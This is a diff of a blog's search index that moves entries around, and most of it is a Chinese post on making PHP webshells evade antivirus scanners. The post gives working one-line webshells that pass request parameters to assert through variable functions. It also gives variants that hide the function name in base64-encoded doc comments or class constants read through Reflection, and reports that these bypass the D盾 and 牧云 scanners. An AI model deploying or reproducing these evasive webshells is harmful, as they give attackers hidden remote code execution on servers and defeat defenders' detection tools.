@@ -1,66 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Webshell免杀的思考与学习</title>
-    <url>/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>webshell</code>对于渗透测试者来说是既是一种结束也是一种开始；一个免杀的<code>webshell</code>是我们在渗透测试过程中能否拿到目标权限的一个“前提”，首先webshell需要存活，其次是否能够执行命令，最后我们使用webshell管理工具时流量是否被拦截。所以免杀至关重要。</p>
-<a id="more"></a>
-<h1 id="我的第一个一句话木马"><a href="#我的第一个一句话木马" class="headerlink" title="我的第一个一句话木马"></a>我的第一个一句话木马</h1><p>很奇怪，我学习安全接触的的第一个一句话木马就是它：<code>$_GET[1]($_POST[2]);</code>，并且令我印象深刻。当时不太理解这个是因为PHP太灵活了，没想到还有这种写法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
-<p>这个木马和上面的例子一样，是一种可变函数，<code>$_GET[1]</code>写为字符串<code>assert</code>，<code>$_POST[2]</code>写为命令<code>phpinfo()</code>。</p>
-<ul>
-<li><p>值得一提的是assert和eval：<br>手册写到eval()不是一个函数而是一个语言构造器，所以不能被可变函数调用；eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，<strong>且必须以分号结尾</strong>。<br>而assert()是一个函数，所以它相比eval灵活许多，可以被可变函数调用，也可以被回调函数来调用。</p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们通过webshell执行命令，是通过我们可控的参数来达到目的，而上面的一句话木马我们可控的部分为POST和GET参数。只要稍作改变就可以绕过D盾的检测</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key =  $_value;</span><br><span class="line">        $_key($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="1.png" alt=""></p>
-</li>
-<li><p>可以看到这里并没有达到免杀效果</p>
-</li>
-</ul>
-<p><img src="D1.png" alt=""></p>
-<ul>
-<li>接下来我又写了一个正常的类与函数，再次扫描发现D盾已经检测不出来了</li>
-</ul>
-<p><img src="D2.png" alt=""></p>
-<hr>
-<p>从可变函数的例子我们可以受到一些启发，通过翻阅PHP手册中的<strong>反射</strong>部分，我们可以得到一些可以利用的函数</p>
-<h1 id="少见的函数"><a href="#少见的函数" class="headerlink" title="少见的函数"></a>少见的函数</h1><h2 id="获取注释"><a href="#获取注释" class="headerlink" title="获取注释"></a>获取注释</h2><p>PHP中有这样一个函数，它可以获取php注释的内容<br><code>public ReflectionClass::getDocComment( void) : string</code><br>某些查杀引擎在查杀的时候，会做类似于编译器的优化，去掉我们所写的注释。毕竟注释是不能运行的，如果我们将参数通过非常规的方式传输进来，这样或许可以绕过一些查杀引擎呢。我们知道，安全狗查形，D盾查参，就拿D盾来试一试。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* YXNzZXJ0YWE=</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Example'</span>);</span><br><span class="line"></span><br><span class="line">$zhushi = substr(($reflector-&gt;getDocComment()), <span class="number">7</span>, <span class="number">12</span>);</span><br><span class="line">$zhushi = base64_decode($zhushi);</span><br><span class="line">$zhushi = substr($zhushi, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">        print_r($$_request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zhushi($_value);</span><br></pre></td></tr></table></figure>
-<p><img src="D3.png" alt=""></p>
-<h2 id="获取定义过的一个常量"><a href="#获取定义过的一个常量" class="headerlink" title="获取定义过的一个常量"></a>获取定义过的一个常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="string">'As'</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="string">'se'</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="string">'rt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$para1;</span><br><span class="line">$para2;</span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">97</span>; $i &lt;= <span class="number">99</span>; $i++) &#123;</span><br><span class="line">    $para1 = $reflector-&gt;getConstant(chr($i));</span><br><span class="line">    $para2.=$para1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$para2($_value);</span><br></pre></td></tr></table></figure>
-<p><img src="D4.png" alt=""></p>
-<h2 id="获取一组常量"><a href="#获取一组常量" class="headerlink" title="获取一组常量"></a>获取一组常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'aS'</span>,<span class="number">2</span>=&gt;<span class="string">'se'</span>,<span class="number">3</span>=&gt;<span class="string">'rT'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$refl = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($refl-&gt;getConstants() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key =&gt; $value1) &#123;</span><br><span class="line">        $value2.=$value1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$value2($_value);</span><br></pre></td></tr></table></figure>
-<p><img src="D5.png" alt=""></p>
-<h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p>P牛的《PHP动态特性的捕捉与逃逸》中提到了一个点，</p>
-<p><img src="php.png" alt=""></p>
-<p>除了PPT里提到的trick，还能想到什么呢？</p>
-<ul>
-<li>面向对象中，类能够继承类的属性与方法。或许可以从这两个点入手，因为测试绕过了”牧云”，就暂时不放出来结果了。<br>至于为什么可以绕过：我的猜想是这个函数不在黑名单中，语法分析不够完善，引擎认为我们的vuln代码并不能执行。</li>
-</ul>
-<p><img src="result1.gif" alt=""></p>
-<h2 id="创建类的实例"><a href="#创建类的实例" class="headerlink" title="创建类的实例"></a>创建类的实例</h2><p><code>public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object</code><br>简单地说，这个方法可以创建一个类的实例，同时该函数传递的参数会传递到该类的构造函数<br>需要注意的是，该方法传参和<code>call_user_func()</code>相似，不能使用引用类型传参，如果要使用引用类型使用另一个方法<code>newInstanceArgs</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//assert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">$para = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//可控的$para</span></span><br><span class="line">$class2 = $class1-&gt;newInstance($para);</span><br></pre></td></tr></table></figure>
-<p>基本的框架就是这样了，对框架进行变形也可绕过”牧云”。</p>
-<p><img src="result2.gif" alt=""></p>
-]]></content>
-      <categories>
-        <category>Webshell</category>
-      </categories>
-      <tags>
-        <tag>Webshell免杀</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>test</title>
-    <url>/2019/10/28/test/</url>
-    <content><![CDATA[<h1 id="It-is-a-Test-Page"><a href="#It-is-a-Test-Page" class="headerlink" title="It is a Test Page"></a>It is a Test Page</h1><p>Hello World<br>最后编辑于2020.5.14</p>
-<a id="more"></a>
-<p>:)</p>
-]]></content>
-  </entry>
-  <entry>
     <title>ThinkPHP6任意文件操作漏洞分析</title>
     <url>/2020/01/26/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>这个洞出来也有一段时间了，看了创宇的paper后觉得蛮简单的，决定自己在本地搭建复现一下，记录一下学习的过程。</p>
@@ -125,6 +65,66 @@
       </categories>
       <tags>
         <tag>ThinkPHP6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>test</title>
+    <url>/2019/10/28/test/</url>
+    <content><![CDATA[<h1 id="It-is-a-Test-Page"><a href="#It-is-a-Test-Page" class="headerlink" title="It is a Test Page"></a>It is a Test Page</h1><p>Hello World<br>最后编辑于2020.5.14</p>
+<a id="more"></a>
+<p>:)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Webshell免杀的思考与学习</title>
+    <url>/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>webshell</code>对于渗透测试者来说是既是一种结束也是一种开始；一个免杀的<code>webshell</code>是我们在渗透测试过程中能否拿到目标权限的一个“前提”，首先webshell需要存活，其次是否能够执行命令，最后我们使用webshell管理工具时流量是否被拦截。所以免杀至关重要。</p>
+<a id="more"></a>
+<h1 id="我的第一个一句话木马"><a href="#我的第一个一句话木马" class="headerlink" title="我的第一个一句话木马"></a>我的第一个一句话木马</h1><p>很奇怪，我学习安全接触的的第一个一句话木马就是它：<code>$_GET[1]($_POST[2]);</code>，并且令我印象深刻。当时不太理解这个是因为PHP太灵活了，没想到还有这种写法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
+<p>这个木马和上面的例子一样，是一种可变函数，<code>$_GET[1]</code>写为字符串<code>assert</code>，<code>$_POST[2]</code>写为命令<code>phpinfo()</code>。</p>
+<ul>
+<li><p>值得一提的是assert和eval：<br>手册写到eval()不是一个函数而是一个语言构造器，所以不能被可变函数调用；eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，<strong>且必须以分号结尾</strong>。<br>而assert()是一个函数，所以它相比eval灵活许多，可以被可变函数调用，也可以被回调函数来调用。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们通过webshell执行命令，是通过我们可控的参数来达到目的，而上面的一句话木马我们可控的部分为POST和GET参数。只要稍作改变就可以绕过D盾的检测</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key =  $_value;</span><br><span class="line">        $_key($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt=""></p>
+</li>
+<li><p>可以看到这里并没有达到免杀效果</p>
+</li>
+</ul>
+<p><img src="D1.png" alt=""></p>
+<ul>
+<li>接下来我又写了一个正常的类与函数，再次扫描发现D盾已经检测不出来了</li>
+</ul>
+<p><img src="D2.png" alt=""></p>
+<hr>
+<p>从可变函数的例子我们可以受到一些启发，通过翻阅PHP手册中的<strong>反射</strong>部分，我们可以得到一些可以利用的函数</p>
+<h1 id="少见的函数"><a href="#少见的函数" class="headerlink" title="少见的函数"></a>少见的函数</h1><h2 id="获取注释"><a href="#获取注释" class="headerlink" title="获取注释"></a>获取注释</h2><p>PHP中有这样一个函数，它可以获取php注释的内容<br><code>public ReflectionClass::getDocComment( void) : string</code><br>某些查杀引擎在查杀的时候，会做类似于编译器的优化，去掉我们所写的注释。毕竟注释是不能运行的，如果我们将参数通过非常规的方式传输进来，这样或许可以绕过一些查杀引擎呢。我们知道，安全狗查形，D盾查参，就拿D盾来试一试。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* YXNzZXJ0YWE=</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Example'</span>);</span><br><span class="line"></span><br><span class="line">$zhushi = substr(($reflector-&gt;getDocComment()), <span class="number">7</span>, <span class="number">12</span>);</span><br><span class="line">$zhushi = base64_decode($zhushi);</span><br><span class="line">$zhushi = substr($zhushi, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">        print_r($$_request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zhushi($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D3.png" alt=""></p>
+<h2 id="获取定义过的一个常量"><a href="#获取定义过的一个常量" class="headerlink" title="获取定义过的一个常量"></a>获取定义过的一个常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="string">'As'</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="string">'se'</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="string">'rt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$para1;</span><br><span class="line">$para2;</span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">97</span>; $i &lt;= <span class="number">99</span>; $i++) &#123;</span><br><span class="line">    $para1 = $reflector-&gt;getConstant(chr($i));</span><br><span class="line">    $para2.=$para1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$para2($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D4.png" alt=""></p>
+<h2 id="获取一组常量"><a href="#获取一组常量" class="headerlink" title="获取一组常量"></a>获取一组常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'aS'</span>,<span class="number">2</span>=&gt;<span class="string">'se'</span>,<span class="number">3</span>=&gt;<span class="string">'rT'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$refl = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($refl-&gt;getConstants() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key =&gt; $value1) &#123;</span><br><span class="line">        $value2.=$value1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$value2($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D5.png" alt=""></p>
+<h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p>P牛的《PHP动态特性的捕捉与逃逸》中提到了一个点，</p>
+<p><img src="php.png" alt=""></p>
+<p>除了PPT里提到的trick，还能想到什么呢？</p>
+<ul>
+<li>面向对象中，类能够继承类的属性与方法。或许可以从这两个点入手，因为测试绕过了”牧云”，就暂时不放出来结果了。<br>至于为什么可以绕过：我的猜想是这个函数不在黑名单中，语法分析不够完善，引擎认为我们的vuln代码并不能执行。</li>
+</ul>
+<p><img src="result1.gif" alt=""></p>
+<h2 id="创建类的实例"><a href="#创建类的实例" class="headerlink" title="创建类的实例"></a>创建类的实例</h2><p><code>public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object</code><br>简单地说，这个方法可以创建一个类的实例，同时该函数传递的参数会传递到该类的构造函数<br>需要注意的是，该方法传参和<code>call_user_func()</code>相似，不能使用引用类型传参，如果要使用引用类型使用另一个方法<code>newInstanceArgs</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//assert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">$para = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//可控的$para</span></span><br><span class="line">$class2 = $class1-&gt;newInstance($para);</span><br></pre></td></tr></table></figure>
+<p>基本的框架就是这样了，对框架进行变形也可绕过”牧云”。</p>
+<p><img src="result2.gif" alt=""></p>
+]]></content>
+      <categories>
+        <category>Webshell</category>
+      </categories>
+      <tags>
+        <tag>Webshell免杀</tag>
       </tags>
   </entry>
   <entry>
